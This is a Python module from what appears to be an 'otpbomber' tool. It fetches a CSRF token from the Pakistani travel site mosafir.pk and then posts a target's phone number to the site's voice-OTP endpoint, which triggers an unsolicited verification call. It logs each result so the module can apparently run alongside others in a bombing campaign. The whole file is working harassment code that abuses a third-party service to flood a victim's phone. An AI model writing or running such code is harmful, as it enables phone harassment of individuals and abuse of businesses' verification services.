from otpbomber.core import *
from otpbomber.localuseragent import *
import re
async def mosafircall(phone, client, out):
    name = "mosafircall"
    domain = "mosafircall"
    frequent_rate_limit=False


    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    }

    response = await client.get('https://mosafir.pk/my-mosafir/home', headers=headers)
    cookies = response.cookies
    csrf_token = re.search(r'csrf-token" content="(.+?)"', response.text).group(1)

    headers = {
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://mosafir.pk',
        'referer': 'https://mosafir.pk/my-mosafir/home',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'x-csrf-token': csrf_token,
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'mobile_country': '+92',
        'mobile': f'{phone[-10:]}',
    }

    response = await client.post('https://mosafir.pk/my-mosafir/voice-otp',headers=headers, data=data,cookies=cookies)
    try:
        data=response.json()
        if data["Status_code"] == "1" and data["message"] == "(200)OK":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
    except Exception:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None